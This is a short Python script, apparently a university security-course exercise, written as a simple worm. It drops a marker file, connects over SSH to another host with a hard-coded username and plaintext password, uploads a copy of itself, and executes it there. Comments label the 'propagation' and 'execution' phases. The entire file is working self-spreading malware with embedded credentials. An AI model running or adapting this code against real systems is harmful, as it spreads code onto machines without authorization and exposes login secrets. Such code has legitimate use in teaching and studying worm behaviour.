

f = open("/tmp/Alejandro_Sanchez.txt", "w")
f.write("Your computer is worming up.")
f.close()

import paramiko
import sys

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect("node4.ecs.fullerton.edu", username= "cpsc456", password="fritwavjon")
sftpClient = ssh.open_sftp()

#propagation phase
sftpClient.put("Alejandro_Sanchez.py" ,"/tmp/" + "Alejandro_Sanchez.py")

# ssh.exec_command("chmod a+x /tmp/Alejandro_Sanchez.py")

#execution phase
ssh.exec_command("python /tmp/Alejandro_Sanchez.py")


#lulz
	
